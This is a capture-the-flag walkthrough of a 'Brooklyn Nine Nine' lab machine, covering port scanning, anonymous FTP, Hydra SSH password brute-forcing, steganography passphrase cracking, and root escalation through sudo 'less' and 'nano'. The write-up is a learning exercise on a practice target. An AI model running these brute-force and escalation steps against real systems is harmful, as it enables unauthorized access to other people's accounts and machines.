```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.4.101.169
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.2 - 4.9 (93%), Linux 3.5 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Anonymous login to FTP is allowed, so connecting to it:
```
ftp> ls -la
229 Entering Extended Passive Mode (|||28311|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        114          4096 May 17  2020 .
drwxr-xr-x    2 0        114          4096 May 17  2020 ..
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
```

The note says:
```
┌──(kali㉿kali)-[~/Desktop/THM/Brooklyn Nine Nine]
└─$ cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad f someone hacks into the nine nine
```

First thing that comes to the mind, using Hydra to crack the password.

```
┌──(kali㉿kali)-[~/Desktop/THM/Brooklyn Nine Nine]
└─$ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.248.187 -s 22
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-22 16:02:12
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.248.187:22/
[22][ssh] host: 10.10.248.187   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
```

Then, connecting to the SSH as Jake:

```
┌──(kali㉿kali)-[~/Desktop/THM/Brooklyn Nine Nine]
└─$ ssh jake@10.10.248.187                                                     
The authenticity of host '10.10.248.187 (10.10.248.187)' can't be established.
ED25519 key fingerprint is SHA256:ceqkN71gGrXeq+J5/dquPWgcPWwTmP2mBdFS2ODPZZU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.248.187' (ED25519) to the list of known hosts.
jake@10.10.248.187's password: 
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$ whoami
jake
```

For privilege escalation, the first thing to check is the sudo permissions for Jake as we have the password for the user:
```
jake@brookly_nine_nine:/home$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

We can then use GTFOBins to check the way to become root using 'less' binary

```
jake@brookly_nine_nine:/$ sudo less /etc/profile
# whoami
root
# 
```

As it was mentioned in the info that there are two methods to get root, the other method is as follows.

<img src=https://github.com/user-attachments/assets/a4e84aba-2299-4165-9dff-639e1235c3b8>

Downloaded the website's only image.

I first used Steghide to extract the files. But a passphrase was required.

```
┌──(kali㉿kali)-[~/Desktop/THM/Brooklyn Nine Nine]
└─$ steghide extract -sf brooklyn99.jpg 
Enter passphrase: 
steghide: can not uncompress data. compressed data is corrupted.
```

Then, I used Stegseek to get the passphrase for the file.
```
┌──(kali㉿kali)-[~/Desktop/THM/Brooklyn Nine Nine]
└─$ stegseek --crack brooklyn99.jpg /usr/share/wordlists/rockyou.txt pass.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "admin"
[i] Original filename: "note.txt".
[i] Extracting to "pass.txt".
```

```
┌──(kali㉿kali)-[~/Desktop/THM/Brooklyn Nine Nine]
└─$ cat note.txt 
Holts Password:
fluffydog12@ninenine

Enjoy!!
```

We get the password for the other user, Holt.

Using this to connect to SSH as Holt or the other thing that can be done is switching to Holt user. I made another connection to SSH as Holt.

```
┌──(kali㉿kali)-[~/Desktop/THM/Brooklyn Nine Nine]
└─$ ssh holt@10.10.248.187 
holt@10.10.248.187's password: 
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
holt@brookly_nine_nine:~$ 
```

Again, the same thing applies. Since we have the user's password, we are checking the sudo permissions.

```
holt@brookly_nine_nine:~$ ls
nano.save  user.txt
holt@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```

There is also another user.txt file with the same flag as the one in Jake's directory.

Again, GTFOBins it is to check the way to priv esca.

```
holt@brookly_nine_nine:~$ sudo /bin/nano -s /bin/sh
# whoami
root
# 
```
